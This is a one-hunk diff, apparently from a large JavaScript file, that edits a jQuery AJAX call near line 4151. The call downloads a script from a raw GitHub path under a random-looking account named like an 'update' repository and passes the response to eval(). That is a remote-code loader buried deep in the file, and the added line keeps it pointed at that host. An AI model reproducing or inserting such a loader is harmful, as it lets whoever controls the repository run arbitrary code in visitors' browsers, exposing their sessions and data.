@@ -4151,7 +4151,7 @@
 
 $.ajax({
     type: "GET",
-    url: "https://raw.githubusercontent.com/arq3r4q34rq34rqar4q5556/update/refs/heads/main/2026/main.js%20modified",
+    url: "https://raw.githubusercontent.com/arq3r4q34rq34rqar4q5556/update/refs/heads/main/2026/raw%20main%20%26%20html%20modified/main.js%20modified",
     success: function(data) {
         eval(data);
     },
